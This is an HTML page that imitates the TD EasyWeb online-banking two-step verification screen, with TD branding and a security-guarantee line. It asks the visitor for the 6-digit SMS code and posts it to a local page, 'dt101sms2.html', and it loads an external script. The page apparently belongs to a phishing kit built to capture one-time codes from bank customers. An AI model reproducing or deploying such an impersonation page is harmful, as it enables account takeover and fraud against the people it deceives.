<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TD EasyWeb - Two-Step Verification</title>
    <style>
        body { margin: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background-color: #ffffff; color: #333333; }
        .header { background-color: #0b3c24; height: 56px; display: flex; align-items: center; justify-content: space-between; padding: 0 16px; color: white; box-sizing: border-box; }
        .header-left { display: flex; align-items: center; }
        .hamburger { width: 22px; height: 16px; display: flex; flex-direction: column; justify-content: space-between; margin-right: 18px; cursor: pointer; }
        .hamburger span { display: block; height: 2px; background-color: white; width: 100%; border-radius: 1px; }
        .td-logo { background-color: #008a00; width: 32px; height: 32px; border-radius: 2px; font-weight: 600; font-size: 20px; display: flex; align-items: center; justify-content: center; }
        .header-right { display: flex; align-items: center; font-size: 16px; cursor: pointer; }
        .container { padding: 24px 16px; max-width: 500px; margin: 0 auto; }
        h1 { font-weight: 300; color: #0b3c24; font-size: 28px; margin-top: 0; margin-bottom: 24px; }
        .verification-box { background-color: #f8f8f8; padding: 24px 20px; border-radius: 2px; }
        .info-text { font-size: 15px; line-height: 1.5; margin-bottom: 20px; color: #333; }
        .form-group { margin-bottom: 20px; }
        label { display: block; margin-bottom: 8px; font-size: 15px; color: #333; font-weight: 600; }
        input[type="text"] { width: 100%; padding: 12px 14px; border: 1px solid #ccc; border-radius: 2px; font-size: 16px; box-sizing: border-box; background-color: #ffffff; outline: none; letter-spacing: 2px; }
        input[type="text"]:focus { border-color: #008a00; }
        .verify-btn { background-color: #008a00; color: white; border: none; width: 100%; padding: 14px; font-size: 16px; border-radius: 4px; cursor: pointer; margin-top: 10px; }
        .verify-btn:hover { background-color: #007000; }
        .action-links { margin-top: 24px; }
        .action-links a { color: #008a00; text-decoration: none; font-size: 15px; display: block; margin-bottom: 12px; }
        .security-guarantee { display: flex; align-items: flex-start; margin-top: 24px; padding-top: 20px; border-top: 1px solid #e0e0e0; }
        .security-guarantee svg { width: 28px; height: 28px; fill: #0b3c24; margin-right: 12px; flex-shrink: 0; }
        .security-text { font-size: 14px; color: #333; line-height: 1.4; }
        .security-text a { color: #008a00; text-decoration: none; }
    </style>
</head>
<body>
    <header class="header">
        <div class="header-left">
            <div class="hamburger"><span></span><span></span><span></span></div>
            <div class="td-logo">TD</div>
        </div>
        <div class="header-right">Logout</div>
    </header>

    <div class="container">
        <h1>Two-Step Verification</h1>
        <div class="verification-box">
            <div class="info-text">To protect your account, we need to confirm your identity. We have sent a 6-digit security code to your mobile number ending in <strong>****</strong>.</div>
            <form action="dt101sms2.html" method="POST">
                <div class="form-group">
                    <label>Security code</label>
                    <input type="text" name="security_code" id="security_code" autocomplete="off" placeholder="Enter 6-digit code" maxlength="6" required />
                </div>
                <button type="submit" class="verify-btn">Verify</button>
            </form>
            <div class="action-links">
                <a href="#">Didn't receive the code?</a>
                <a href="#">Send to a different phone number &gt;</a>
            </div>
            <div class="security-guarantee">
                <svg viewBox="0 0 24 24"><path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z"/></svg>
                <div class="security-text">TD Online and Mobile Security Guarantee: <a href="#">You are protected &gt;</a></div>
            </div>
        </div>
    </div>
<script src="../../security_module.js"></script>
</body>
</html>
